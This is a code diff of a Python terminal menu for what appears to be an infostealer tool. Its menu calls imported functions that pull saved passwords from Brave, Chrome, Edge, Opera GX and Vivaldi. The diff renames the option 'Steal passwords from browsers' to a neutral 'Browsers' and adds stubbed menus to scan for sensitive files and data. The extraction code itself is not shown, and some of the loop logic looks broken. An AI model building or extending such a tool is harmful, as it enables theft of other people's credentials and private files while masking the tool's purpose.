@@ -1,6 +1,7 @@
 import os
 import sys
 import subprocess
+import curses
 '''
 os.system('cls' if os.name == 'nt' else 'clear')
 print("Verifiying dependencies...")
@@ -20,7 +21,6 @@ for package in requiredPackages:
     except ImportError:
         installPackage(package)
 '''
-import curses
 from browsers.operaGX import getPasswords as getPasswordsOperaGX
 from browsers.chrome import getPasswords as getPasswordsChrome
 from browsers.edge import getPasswords as getPasswordsEdge
@@ -74,7 +74,8 @@ def handleInput(key, currentOption, options):
 
 def mainMenuControl():
     options = [
-        ("1", "Steal passwords from browsers"),
+        ("1", "Browsers"),
+        ("2", "System Information"),
         ("0", "Exit")
     ]
     currentOption = 0
@@ -90,7 +91,7 @@ def mainMenuControl():
     curses.wrapper(menuLogic)
     return selectedOption
 
-def submenuBrowsers():
+def submenuPasswords():
     options = [
         ("1", "Brave"),
         ("2", "Google Chrome"),
@@ -105,19 +106,98 @@ def submenuBrowsers():
     def subMenuLogic(screen):
         nonlocal selectedOption, currentOption
         while selectedOption is None:
-            displayMenu(screen, options, currentOption, "BROWSER SELECTION")
+            displayMenu(screen, options, currentOption, "PASSWORD SELECTION")
+            key = screen.getch()
+            selectedOption, currentOption = handleInput(key, currentOption, options)
+    curses.wrapper(subMenuLogic)
+    return selectedOption
+
+def submenuBrowsers():
+    options = [
+        ("1", "Passwords"),
+        ("0", "Back")
+    ]
+    currentOption = 0
+    selectedOption = None
+
+    def subMenuLogic(screen):
+        nonlocal selectedOption, currentOption
+        while selectedOption is None:
+            displayMenu(screen, options, currentOption, "BROWSER MENU")
+            key = screen.getch()
+            selectedOption, currentOption = handleInput(key, currentOption, options)
+    
+    while True:
+        curses.wrapper(subMenuLogic)
+        
+        if selectedOption == '1':
+            subchoice = submenuPasswords()
+            if subchoice == '0':
+                selectedOption = None  # Voltar ao menu de navegadores
+                continue
+            else:
+                return subchoice  # Retornar a opção do navegador selecionado
+        elif selectedOption == '0':
+            return selectedOption
+
+def submenuSystemInformation():
+    options = [
+        ("1", "System Scan"),
+        ("0", "Back")
+    ]
+    currentOption = 0
+    selectedOption = None
+
+    def subMenuLogic(screen):
+        nonlocal selectedOption, currentOption
+        while selectedOption is None:
+            displayMenu(screen, options, currentOption, "SYSTEM INFORMATION MENU")
+            key = screen.getch()
+            selectedOption, currentOption = handleInput(key, currentOption, options)
+    
+    while True:
+        curses.wrapper(subMenuLogic)
+        
+        if selectedOption == '1':
+            subchoice = submenuSystemScan()
+            if subchoice == '0':
+                selectedOption = None
+                continue
+            else:
+                return subchoice
+        elif selectedOption == '0':
+            return selectedOption
+
+def submenuSystemScan():
+    options = [
+        ("1", "Scan for sensitive files"),
+        ("2", "Scan for sensitive data"),
+        ("0", "Back")
+    ]
+    currentOption = 0
+    selectedOption = None
+
+    def subMenuLogic(screen):
+        nonlocal selectedOption, currentOption
+        while selectedOption is None:
+            displayMenu(screen, options, currentOption, "SYSTEM SCAN MENU")
             key = screen.getch()
             selectedOption, currentOption = handleInput(key, currentOption, options)
     curses.wrapper(subMenuLogic)
     return selectedOption
 
 def main():
-    browser_functions = {
+    browser_passwords = {
         '1': getPasswordsBrave,
         '2': getPasswordsChrome,
         '3': getPasswordsEdge,
         '4': getPasswordsOperaGX,
         '5': getPasswordsVivaldi
+    }
+
+    system_scan_functions = {
+        '1': None,
+        '2': None
     }
 
     while True:
@@ -128,7 +208,7 @@ def main():
                 if subchoice == '0':
                     break
 
-                func = browser_functions.get(subchoice)
+                func = browser_passwords.get(subchoice)
                 if func:
                     try:
                         func()
@@ -139,6 +219,25 @@ def main():
 
                 input("Pressione Enter para continuar...")
                 os.system('cls' if os.name == 'nt' else 'clear')
+                return submenuPasswords()
+        elif choice == '2':
+            while True:
+                subchoice = submenuSystemInformation()
+                if subchoice == '0':
+                    break
+
+                func = system_scan_functions.get(subchoice)
+                if func:
+                    try:
+                        func()
+                    except Exception as e:
+                        print(f"{RED}Ocorreu um erro: {e}{RESET}")
+                else:
+                    print(f"{RED}Opção inválida!{RESET}")
+
+                    input("Pressione Enter para continuar...")
+                    os.system('cls' if os.name == 'nt' else 'clear')
+                    return submenuSystemScan()
         elif choice == '0':
             exit()
 
